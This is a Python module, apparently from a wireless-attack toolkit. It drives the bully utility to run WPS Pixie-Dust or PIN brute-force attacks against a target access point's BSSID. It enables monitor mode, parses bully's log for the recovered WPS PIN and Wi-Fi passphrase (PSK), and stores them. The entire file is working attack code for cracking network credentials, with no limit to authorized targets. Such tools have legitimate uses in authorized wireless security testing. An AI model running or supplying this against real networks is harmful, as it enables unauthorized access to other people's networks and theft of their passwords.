"""WPS Pixie-Dust and PIN brute-force via bully."""

import asyncio
import os
import re
from pathlib import Path

from core.exec_utils import validate_mac, validate_channel
from core.hardware import start_monitor_mode, stop_monitor_mode, track_process
from core.models import save_result
from core.display import console, info, ok, warn, err, header, StatusLine

CAPTURE_DIR = Path("captures")


async def run_wps_attack(
    interface: str, bssid: str, channel: str,
    profile: str = "pixie", delay: int = 5, nofcs: bool = False,
) -> None:
    header("WPS Pixie-Dust / PIN Brute-Force")
    if not validate_mac(bssid):
        err("Invalid BSSID"); return
    if not validate_channel(channel):
        err("Invalid channel"); return

    CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
    mon_iface = await start_monitor_mode(interface)
    ok(f"Monitor mode active on {mon_iface}")

    log_file = CAPTURE_DIR / f"wps_{bssid.replace(':','')}.log"
    bully_opts = ["--bssid", bssid, "--channel", channel, "--detectlock", "--retry", "2"]
    if profile == "pixie":
        bully_opts = ["--pixie"] + bully_opts
        info("Mode: Pixie-Dust (fast, works against vulnerable chipsets)")
    else:
        bully_opts += ["--bruteforce"]
        if delay:
            bully_opts += ["--delay", str(delay)]
        info(f"Mode: Full PIN brute-force (delay={delay}s between attempts — this can take hours)")
    if nofcs:
        bully_opts += ["--nofcs"]
        info("--nofcs enabled (needed for some RTL/Realtek chipsets)")

    bully_opts += ["--logfile", str(log_file), "--verbosity", "2"]
    bully_cmd = ["bully"] + bully_opts + [mon_iface]

    proc = await asyncio.create_subprocess_exec(*bully_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    track_process(proc)

    pin, psk, current_pin = None, None, None
    last_size = 0
    try:
        with StatusLine("Attacking WPS...") as status:
            while proc.returncode is None:
                if log_file.exists():
                    size = log_file.stat().st_size
                    if size > last_size:
                        content = log_file.read_text(errors="replace")
                        last_size = size
                        pin_match = re.search(r"PIN:\s*'(\d{4,8})'", content)
                        psk_match = re.search(r"PSK:\s*'(.+?)'", content)
                        trying_match = re.search(r"[Tt]rying\s+(?:pin\s+)?(\d{4,8})", content)
                        if pin_match:
                            pin = pin_match.group(1)
                        if psk_match:
                            psk = psk_match.group(1)
                        if trying_match:
                            current_pin = trying_match.group(1)
                        locked = "WPS lock" in content or "Locked" in content
                        status_txt = f"trying PIN {current_pin or '...'}"
                        if locked:
                            status_txt += "  [yellow]⚠ WPS lock detected[/yellow]"
                        status.update(status_txt)
                        if psk:
                            break
                await asyncio.sleep(1)
                try:
                    await asyncio.wait_for(proc.wait(), timeout=0.01)
                except asyncio.TimeoutError:
                    pass
    except (KeyboardInterrupt, asyncio.CancelledError):
        warn("Stopped by user.")
    finally:
        if proc.returncode is None:
            proc.terminate()
            try:
                await proc.wait()
            except Exception:
                pass
        await stop_monitor_mode(mon_iface)

    if psk:
        ok(f"PSK RECOVERED: [bold green]{psk}[/bold green]  (PIN: {pin or '?'})")
        save_result(bssid.replace(":", ""), "wps", bssid, "", psk, {"pin": pin})
    elif pin:
        ok(f"PIN found: [bold green]{pin}[/bold green] (PSK not yet retrieved — AP may need to be re-queried)")
    else:
        warn("No PIN/PSK recovered this session.")
